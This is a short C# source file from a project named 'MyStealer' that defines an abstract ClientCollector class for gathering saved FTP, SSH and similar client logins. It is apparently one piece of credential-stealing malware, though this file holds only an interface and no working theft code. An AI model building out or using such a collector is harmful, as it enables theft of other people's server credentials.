using System.Collections.Immutable;

namespace MyStealer.Collector.Client
{
    /// <summary>
    /// A module that collects FTP/SSH/etc. Client logins.
    /// </summary>
    public abstract class ClientCollector : CollectorBase
    {
        public abstract IImmutableSet<ClientLogin> GetLogins();
    }
}
